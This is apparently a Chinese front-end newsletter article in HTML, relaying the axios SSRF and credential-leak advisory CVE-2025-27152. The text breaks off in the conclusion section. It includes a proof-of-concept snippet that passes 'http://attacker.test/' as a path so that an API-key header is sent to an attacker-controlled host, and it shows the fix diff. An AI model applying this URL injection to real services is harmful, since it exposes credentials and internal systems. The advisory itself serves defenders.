{
  "id": "RAW_e03407",
  "title": "【早阅】Axios 请求可能存在 SSRF 和凭据泄露风险",
  "url": "https://mp.weixin.qq.com/s/_2xxioxJRRGfJ0GbF-g_GA",
  "date": "2025-03-17 23:45:10",
  "author": "jasonsaayman",
  "siteName": "前端早读课",
  "content": "<html>\n <head></head>\n <body>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px !important;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">Axios 请求可能存在 SSRF（服务器端请求伪造）和凭据泄露风险</span></p>\n  <blockquote style=\"box-sizing: border-box;margin: 0px 0px 16px;padding: 0px 1em;color: rgb(119, 119, 119);border-left: 0.25em solid rgb(221, 221, 221);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: normal;orphans: 2;text-align: start;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;white-space: normal;text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;\">\n   <p style=\"box-sizing: border-box;margin-top: 0px;margin-bottom: 0px;\"><span leaf=\"\">作者：@jasonsaayman</span><span leaf=\"\"> \n     <br> \n    </span><span leaf=\"\">原文：</span><span leaf=\"\">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</span></p>\n  </blockquote>\n  <h4 data-edit=\"早编辑器\" style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:600;letter-spacing:normal;font-size:18px;line-height:1.25;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:24px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">背景</span></h4>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">GitHub Advisory Database 最近发布了一个关于 axios 库的高严重性漏洞（CVE-2025-27152）。该漏洞涉及使用绝对 URL 时可能导致服务器端请求伪造（SSRF）和凭证泄露。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">axios 是一个广泛使用的 JavaScript 库，用于在浏览器和 Node.js 中发起 HTTP 请求。目前最新版本是V1.8.3。</span></p>\n  <section style=\"text-align: center;\" nodeleaf=\"\">\n   <img data-src=\"https://imagedelivery.net/qGOFcc1O8XwTZW3W1JAHHg/a07da9af-ccff-4274-523c-10efe6069900/public\" class=\"rich_pages wxw-img\" data-ratio=\"0.5934065934065934\" data-s=\"300,640\" data-type=\"png\" data-w=\"2184\" type=\"block\" data-imgfileid=\"503792340\" src=\"https://imagedelivery.net/qGOFcc1O8XwTZW3W1JAHHg/a07da9af-ccff-4274-523c-10efe6069900/public\">\n  </section>\n  <h4 data-edit=\"早编辑器\" style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:600;letter-spacing:normal;font-size:18px;line-height:1.25;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:24px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">要点</span></h4>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><strong style=\"box-sizing: border-box;font-weight: 600;\"><span leaf=\"\">漏洞描述</span></strong></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">当使用绝对 URL 时，axios 会忽略&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">baseURL</span></code><span leaf=\"\">&nbsp;的设置，直接将请求发送到指定的绝对 URL，这可能导致 SSRF 攻击和敏感凭证泄露。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">在传递绝对 URL 而不是协议相对 URL 给 Axios 时，即使设置了 baseURL，Axios 仍然会向指定的绝对 URL 发送请求。这可能导致 SSRF（服务器端请求伪造）和凭据泄露。此问题影响 Axios 在服务器端和客户端的使用。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><strong style=\"box-sizing: border-box;font-weight: 600;\"><span leaf=\"\">影响范围</span></strong></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">所有使用&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">baseURL</span></code><span leaf=\"\">&nbsp;且未对路径参数进行验证的软件都可能受到影响。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><strong style=\"box-sizing: border-box;font-weight: 600;\"><span leaf=\"\">修复版本</span></strong></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">axios 1.8.2 版本已修复此问题。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\"><a style=\"\" href=\"https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&amp;mid=2651270139&amp;idx=1&amp;sn=2c094d7b2191b5cdb7e0ffb37215bdc8&amp;scene=21#wechat_redirect\" textvalue=\"【第3234期】fetchLater：JS全新API支持关闭页面时安全发送网络请求\" data-itemshowtype=\"11\" target=\"_blank\" linktype=\"text\" data-linktype=\"2\">【第3234期】fetchLater：JS全新API支持关闭页面时安全发送网络请求</a></span></p>\n  <h4 data-edit=\"早编辑器\" style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:600;letter-spacing:normal;font-size:18px;line-height:1.25;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:24px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">分析</span></h4>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">该漏洞的核心问题在于 axios 在处理绝对 URL 时未正确验证&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">baseURL</span></code><span leaf=\"\">。例如，即使设置了&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">baseURL</span></code><span leaf=\"\">&nbsp;为&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">http://example.test/api/v1/users/</span></code><span leaf=\"\">，如果用户传入的路径参数为&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">http://attacker.test/</span></code><span leaf=\"\">，axios 会将请求发送到&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">http://attacker.test/</span></code><span leaf=\"\">，而不是预期的&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">baseURL</span></code><span leaf=\"\">。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">请考虑以下代码片段：</span></p>\n  <pre tabindex=\"0\" style=\"-webkit-text-stroke-width:0px;padding:10px;letter-spacing:normal;text-decoration-style:initial;box-sizing:border-box;text-decoration-thickness:initial;overflow-wrap:normal;border-radius:3px;text-transform:none;word-spacing:0px;overflow:auto;text-indent:0px;margin-top:0px;margin-bottom:16px;orphans:2;text-decoration-color:initial;widows:2;font:400 13.6px / 1.45 Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;text-align:start;\"><code style=\"border:0px;padding:0px;margin:0px;font-size:12px;line-height:inherit;box-sizing:border-box;overflow-wrap:normal;border-radius:5px;overflow:auto;word-break:normal;font-family:Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;\"><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">import</span></span><span leaf=\"\">&nbsp;axios&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">from</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">\"axios\"</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span><span leaf=\"\"><br></span><span leaf=\"\"><br></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">const</span></span><span leaf=\"\">&nbsp;internalAPIClient&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">=</span></span><span leaf=\"\">&nbsp;axios</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">create</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">(</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">{</span></span><span leaf=\"\"><br></span><span leaf=\"\">&nbsp; &nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">baseURL</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">:</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">\"http://example.test/api/v1/users/\"</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\"><br></span><span leaf=\"\">&nbsp; &nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">headers</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">:</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">{</span></span><span leaf=\"\"><br></span><span leaf=\"\">&nbsp; &nbsp; &nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">\"X-API-KEY\"</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">:</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">\"1234567890\"</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\"><br></span><span leaf=\"\">&nbsp; &nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">}</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\"><br></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">}</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">)</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span><span leaf=\"\"><br></span><span leaf=\"\"><br></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">// const userId = \"123\";</span></span><span leaf=\"\"><br></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">const</span></span><span leaf=\"\">&nbsp;userId&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">=</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">\"http://attacker.test/\"</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span><span leaf=\"\"><br></span><span leaf=\"\"><br></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">await</span></span><span leaf=\"\">&nbsp;internalAPIClient</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">get</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">(</span></span><span leaf=\"\">userId</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">)</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">// SSRF</span></span></code></pre>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">在这个示例中，请求被发送到了&nbsp;</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">http://attacker.test/</span></code><span leaf=\"\">，而不是 baseURL。因此，</span><code style=\"box-sizing: border-box;font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 13.6px;padding: 0.2em 0px;margin: 0px;background-color: rgba(0, 0, 0, 0.04);border-radius: 5px;\"><span leaf=\"\">attacker.test</span></code><span leaf=\"\">&nbsp;的域名所有者将能够获取请求头中包含的 X-API-KEY，导致凭据泄露。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\"><a style=\"\" href=\"https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&amp;mid=2651270353&amp;idx=1&amp;sn=6c35a35dd447241a9b74f3bc60f86c22&amp;scene=21#wechat_redirect\" textvalue=\"【第3241期】await 能有什么风险？JavaScript 世界的隐忧\" data-itemshowtype=\"11\" target=\"_blank\" linktype=\"text\" data-linktype=\"2\">【第3241期】await 能有什么风险？JavaScript 世界的隐忧</a></span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">在 V1.8.2 中已修复此问题</span></p>\n  <pre tabindex=\"0\" style=\"-webkit-text-stroke-width:0px;padding:10px;letter-spacing:normal;text-decoration-style:initial;box-sizing:border-box;text-decoration-thickness:initial;overflow-wrap:normal;border-radius:3px;text-transform:none;word-spacing:0px;overflow:auto;text-indent:0px;margin-top:0px;margin-bottom:16px;orphans:2;text-decoration-color:initial;widows:2;font:400 13.6px / 1.45 Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;text-align:start;\"><code style=\"border:0px;padding:0px;margin:0px;font-size:12px;line-height:inherit;box-sizing:border-box;overflow-wrap:normal;border-radius:5px;overflow:auto;word-break:normal;font-family:Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;\"><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">-</span></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">const</span></span><span leaf=\"\">&nbsp;fullPath&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">=</span></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">buildFullPath</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">(</span></span><span leaf=\"\">config</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span leaf=\"\">baseURL</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\">&nbsp;config</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span leaf=\"\">url</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">)</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span><span leaf=\"\"><br></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">+</span></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">const</span></span><span leaf=\"\">&nbsp;fullPath&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">=</span></span><span leaf=\"\">&nbsp;</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">buildFullPath</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">(</span></span><span leaf=\"\">config</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span leaf=\"\">baseURL</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\">&nbsp;config</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span leaf=\"\">url</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">,</span></span><span leaf=\"\">&nbsp;config</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">.</span></span><span leaf=\"\">allowAbsoluteUrls</span><span style=\"box-sizing:border-box;\"><span leaf=\"\">)</span></span><span style=\"box-sizing:border-box;\"><span leaf=\"\">;</span></span></code></pre>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">这可能导致以下问题：</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><strong style=\"box-sizing: border-box;font-weight: 600;\"><span leaf=\"\">凭证泄露</span></strong></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">攻击者可以通过构造恶意 URL 获取包含敏感信息的请求头，如 API 密钥。</span></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><strong style=\"box-sizing: border-box;font-weight: 600;\"><span leaf=\"\">SSRF 攻击</span></strong></p>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">攻击者可以利用此漏洞向内部网络中的其他主机发送请求，可能导致内部系统被入侵。</span></p>\n  <h4 data-edit=\"早编辑器\" style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:600;letter-spacing:normal;font-size:18px;line-height:1.25;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:24px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;margin-bottom:16px;orphans:2;text-decoration-color:initial;font-variant-ligatures:normal;widows:2;text-align:start;\"><span leaf=\"\">结论</span></h4>\n  <p style=\"-webkit-text-stroke-width:0px;font-variant-caps:normal;white-space:normal;font-weight:400;letter-spacing:normal;font-size:16px;text-decoration-style:initial;font-style:normal;box-sizing:border-box;text-decoration-thickness:initial;text-transform:none;word-spacing:0px;text-indent:0px;margin-top:0px;font-family:Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, 